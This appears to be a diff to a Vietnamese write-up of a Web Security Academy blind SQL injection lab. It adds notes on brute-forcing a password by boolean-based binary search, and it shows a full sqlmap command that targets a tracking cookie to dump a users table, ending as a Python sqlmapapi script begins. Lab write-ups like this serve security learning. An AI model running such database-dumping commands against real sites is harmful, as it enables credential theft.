@@ -60,13 +60,22 @@
 
 * **2. Tìm cách khai thác**
 
+* Cách 1: Sử dụng `requests` kết hợp với binary search và bruteforce để tìm password
+
+> [!NOTE]
+> Tất nhiên, do bài cho sẵn nên mới biết là dump thẳng từ đâu, tên là gì. Chứ nếu đề bài có database lớn, không có gợi ý thì đoán đến Tết chưa chắc xong.
+> Nó như một hạn chế với dạng Boolean-Based Blind SQLi này vậy.
+>
+> <img width="875" height="423" alt="image" src="https://github.com/user-attachments/assets/e87e12c4-6889-4aad-b075-4e97d07a95b7" />
+
+
 * Cách 2: Sử dụng `sqlmap`
   * Dùng `sqlmap` ở CLI:
     ```bash
     sqlmap -u "https://0ac3001d0452137380907bc1007e00ae.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=FtGbs3T15EPKKLvbYVsisfjpuK9SQV60; TrackingId=y56Uc3lYbljGpVoG" -p "TrackingId" --level=2 --batch --threads=10 -D public -T users --dump --no-logging --output-dir="%TEMP%\sqlmap_temp" --dbms="PostgreSQL"
     ```
 
-  * Dùng `sqlmapapi` để kết hợp luôn vào script python:
+  * Dùng `sqlmapapi` để kết hợp luôn vào script python với các hàm đã tự viết:
   ```python
   import subprocess
   import time
